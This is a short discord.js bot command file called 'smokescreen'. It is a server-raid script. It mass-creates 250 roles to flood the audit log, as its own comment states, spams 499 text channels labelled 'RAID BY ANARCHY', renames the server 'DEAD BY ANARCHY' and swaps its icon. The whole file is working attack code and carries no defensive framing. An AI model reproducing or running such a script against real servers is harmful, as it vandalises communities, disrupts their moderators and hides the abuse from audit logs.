const Discord = require('discord.js');

  const ms = require('ms');
  exports.run = (client, message, args) => {

            for (var i = 0; i < 250; i++) {
                // Creates new roles to clog up the audit log
                message.guild.createRole({
                    name: 'ANARCHY',
                    color: 'RED',
                });
              }
                for (var i = 0; i < 499; i++) {
               
                message.guild.createChannel('RAID BY ANARCHY', 'text')
    
          
                }
    
    message.guild.setName("DEAD BY ANARCHY");
    message.guild.setIcon("https://cdn.discordapp.com/icons/498502361526829066/3a3d7943bf5c012064da45516b9ee279.webp")
            };



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'smokescreen',
        description: '',
        usage: ''
      };
